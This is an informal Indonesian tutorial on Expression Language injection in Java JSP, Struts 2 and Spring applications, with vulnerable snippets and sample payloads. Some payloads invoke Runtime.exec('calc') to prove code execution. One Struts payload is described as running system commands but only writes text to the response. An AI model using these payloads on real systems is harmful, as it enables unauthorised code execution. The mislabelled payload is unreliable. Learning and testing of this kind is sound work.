#  EL Injection- JSP Vulnerability 

## 🧠 Apa Itu EL Injection?

**Jadi gini... EL Injection (Expression Language Injection) itu semacam celah keamanan yang biasa nongol di aplikasi Java, apalagi yang pakai teknologi kaya JSP, JSF, atau framework Java lain yang mendukung Expression Language (EL).
Nah, EL ini tuh semacam cara buat “nyelipin” logika di halaman web. Contohnya:**

```jsp
Hello, ${user.name}
```
Harusnya ini cuma nampilin nama user doang, kan?

Tapi masalahnya, kalau input dari user langsung dimasukin ke EL tanpa disaring dulu, itu kayak ngasih akses buat user nakal nulis kode sendiri di situ 😱

## 💥 Contoh Kasus
Bayangin ada form input nama:

```jsp
Hello, ${param.username}
```
Kalau kamu isi `username=Gamer123`, maka hasilnya:

```jsp
Hello, Gamer123
```

Tapi kalau kamu iseng masukin:
```bash
${7*7}
```
Boom! Halaman bisa jadi:
``` bash
Hello, 49
```
Itu tandanya EL Injection berhasil! Kamu baru aja ngejalanin ekspresi matematika lewat input user.

## oke,kita masuk ke contoh lain dari kerentanan EL Injection di JSP:

```jsp
<%
    String userInput = request.getParameter("input");
%>
<p>Result: ${userInput}</p>
```

Jika `userInput` tidak disanitasi, attacker bisa memasukkan payload EL untuk mengeksekusi ekspresi berbahaya.
Untuk implementasi pentest, Anda bisa coba mengirimkan payload seperti:
``` bash
${''.class.forName('java.lang.Runtime').getRuntime().exec('calc')}
```

ayload EL Injection yang spesifik untuk beberapa framework Java populer yang menggunakan Expression Language, seperti Apache Struts, Spring, atau JSF.

Misalnya, untuk Apache Struts 2 yang rentan EL Injection, payload berikut bisa digunakan untuk mengeksekusi perintah sistem (jika kerentanan ada):
``` bash
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Injection','vulnerable')}
```

Payload ini mencoba menambahkan header HTTP sebagai bukti eksekusi EL.

Untuk payload yang menjalankan perintah sistem (berisiko tinggi dan harus dengan izin):
``` bash
%{#runtime=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].getWriter(),#runtime.println('Injected'),#runtime.flush(),#runtime.close()}
```

### Untuk Spring Expression Language (SpEL), payload contoh:
``` bash
#{T(java.lang.Runtime).getRuntime().exec('calc')}
```
Payload ini bisa dimasukkan ke parameter input yang rentan.
